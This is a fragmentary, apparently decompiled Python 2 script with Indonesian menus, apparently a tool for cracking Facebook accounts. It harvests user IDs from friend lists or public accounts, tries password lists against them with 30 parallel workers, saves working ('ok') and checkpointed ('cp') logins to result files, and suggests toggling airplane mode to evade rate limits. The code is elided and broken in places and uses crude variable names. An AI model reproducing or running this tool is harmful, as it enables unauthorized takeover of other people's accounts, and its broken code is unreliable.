...
# Time Succes decompile : 2022-02-07 18:44:46.576076
...
def moch_yayan():
	...
	print(" %s1%s. crack dari akun public)"%(M,N))
	print(" %s2%s. mulai crack)"%(M,N))
	print(" %s3%s. liat hasil crack)"%(M,N))
	print(" %s0%s. logout (hapus login)"%(M,N))
    pepek = raw_input("\n  pilih menu : ")
    if pepek == '':
        print '\n %s[%s×%s] yang bener'%(N,M,N);time.sleep(2);moch_yayan()
    elif pepek in['','']:
        teman(kontol)
    elif pepek in['1','01']:
        publik(kontol)
...
def teman(kontol):
    ...
    try:
        ...
        asw = raw_input(' %s[%s?%s] limit id \x1b[1;92m 5000   : '%(N,O,N))
        cin = ('KNT/' + mmk + '.ARA').replace(' ', '_')
        xxx = open(cin, 'w')
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
        ___yayanganteng___ = raw_input(' [%s?%s] apakah kamu mau mengunakan kata sandi ini [𝘆/𝘁]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] gunakan , (koma) untuk pemisahan contoh : 𝘀𝗮𝗻𝗱𝗶123,𝘀𝗮𝗻𝗱𝗶12345,𝗱𝗹𝗹. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
                print ' [*] crack dengan kata sandi -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s×%s] jangan kosong kata sandi'%(N,M,N)
                elif len(pwek)<=5:
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%s×%s] jangan kosong'%(N,M,N);__yan__()()
                        elif cin == '1':
                            print '\n [%s+%s] hasil ok disimpan ke -> results3/ok-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil cp disimpan ke -> results/cp-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] kamu bisa aktifkan mode pesawat 3detik\n'%(M,N)
                    ...
                    print '\n [ pilih metode crack ]\n'
                    print ' [%s1%s]. metode cepat hasil sedikit'%(O,N)
                    print ' [%s2%s]. metode slow hasil banyak'%(O,N)
                    print ' [%s3%s]. metode slow (recommend)'%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print ' [%s1%s] api cepat '%(O,N)
            print ' [%s2%s] sloww lambat'%(O,N)
            print ' [%s3%s] sloww (recommend)'%(O,N)
            self.__pler__()
        else:
    ...
    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] proses crack %s/%s -> 𝔬𝔨-:%s - 𝔠𝔭-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
    ...
    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] proses crack%s/%s -> 𝑜𝑘-:%s - 𝑐𝑝-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
    ...
    def __pler__(self):
        yan = raw_input('\n pilih menu : ')
        if yan == '':
            print '\n %s[%s×%s] jangan kosong'%(N,M,N);self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] hasil ok disimpan ke -> results/ok-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil cp disimpan ke -> results/cp-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa aktifkan mode pesawat 3detik\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
